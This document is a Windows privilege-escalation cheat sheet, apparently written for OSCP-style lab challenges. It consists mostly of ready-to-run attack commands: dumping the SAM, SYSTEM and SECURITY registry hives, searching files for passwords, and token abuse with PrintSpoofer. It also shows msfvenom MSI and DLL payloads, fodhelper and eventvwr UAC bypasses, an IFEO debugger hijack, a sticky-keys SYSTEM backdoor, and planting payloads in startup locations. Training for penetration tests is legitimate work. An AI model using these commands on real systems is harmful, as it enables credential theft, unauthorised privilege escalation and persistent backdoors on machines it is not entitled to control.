# Windows Privilege Escalation

## Windows Privilege Escalation

If you’ve landed a low-priv shell on a Windows machine during an OSCP-style challenge, follow along now...

***

### Automated Enumeration

```
# WinPEAS
winPEASx64.exe / winPEAS.bat

# PowerUp (PowerShell)
Invoke-AllChecks

# Seatbelt
Seatbelt.exe all
```

> Run with caution; log-heavy tools may trigger alerts. Validate everything manually.

***

### Initial Recon

```
whoami
whoami /groups
whoami /priv
hostname
systeminfo
ver
env
net users
net localgroup
net user <username>
query user
tasklist
ipconfig /all
```

***

### Credential Hunting

```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
cmdkey /list
findstr /si password *.txt
findstr /si pass *.xml
findstr /si password *.ini
findstr /si password *.config
reg save HKLM\SAM sam
reg save HKLM\SYSTEM system
reg save HKLM\SECURITY security
```

> Analyze saved hives with secretsdump or mimikatz offline. Don’t skip AppData, Recycle Bin, ProgramData, or temp folders.

***

### Token Abuse and Sudo-like Privileges

```
whoami /priv
whoami /groups
```

If you have `SeImpersonatePrivilege`, use PrintSpoofer:

```
PrintSpoofer.exe -i -c cmd
```

Other privileges:

* `SeAssignPrimaryTokenPrivilege`
* `SeTcbPrivilege`

> Useful for Juicy Potato / Rogue Potato / PotatoNG if PrintSpoofer fails.

***

### Services, Scheduled Tasks, and Misconfigs

```
sc query state= all
sc qc <service>
accesschk.exe -uwcqv "Authenticated Users" *
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /v /i "\""
schtasks /query /fo LIST /v
```

> Look for services with weak permissions, unquoted paths, and scheduled tasks running as SYSTEM but pointing to writable scripts.

***

### AlwaysInstallElevated

```
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

If both keys are set to 1:

```
msfvenom -p windows/exec CMD=cmd.exe -f msi > payload.msi
msiexec /quiet /qn /i C:\Users\<user>\payload.msi
```

***

### DLL Hijacking and Search Order Abuse

> Use Procmon to monitor DLL load order. Drop malicious DLLs where apps expect them.

```
msfvenom -p windows/x64/exec CMD="cmd.exe" -f dll > exploit.dll
```

> Restart the service or wait for the binary to trigger load.

***

### UAC Bypass Techniques

```
# Fodhelper
reg add HKCU\Software\Classes\ms-settings\shell\open\command /d "cmd.exe" /f
reg add HKCU\Software\Classes\ms-settings\shell\open\command /v "DelegateExecute" /t REG_SZ /d "" /f
start fodhelper.exe

# Eventvwr
reg add HKCU\Software\Classes\mscfile\shell\open\command /d "cmd.exe" /f
start eventvwr.exe

# SilentCleanup
schtasks /Run /TN \"\Microsoft\Windows\DiskCleanup\SilentCleanup\"
```

> Requires Auto-elevated binaries. Useful when UAC is in default or misconfigured state.

***

### Registry and Image File Execution Options (IFEO)

```
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe" /f
```

> Works if you have permission to edit the registry and IFEO keys are respected.

***

### Sticky Keys Backdoor

```
copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
```

> At login screen, press Shift five times to pop a SYSTEM shell.

***

### Kernel Exploits

```
systeminfo > systeminfo.txt
windows-exploit-suggester.py --database 2024-05-01-mssb.xlsx --systeminfo systeminfo.txt
```

> Use only as a last resort. Validate versions and potential BSOD risks.

***

### WMI and Logon Script Abuse

* Permanent WMI Event Consumers
* Custom logon scripts in user folder or registry (`HKCU\Environment\UserInitMprLogonScript`)

> Use PowerShell to register events or inspect scripts run at logon.

***

### Startup Folders and Run Keys

```
dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
```

> If writable, place a payload there.

***

### PowerShell History and Console Logs

```
Get-History
cat $env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

> Useful for finding commands, credentials, or recon trails left by the user.

***

### File and Folder Permissions

```
icacls C:\ /T /C 2>nul | findstr /i "Everyone:(F)" > perms.txt
accesschk.exe -wus "Users" *
```

> Check writable paths, uploads, service binaries, log folders.
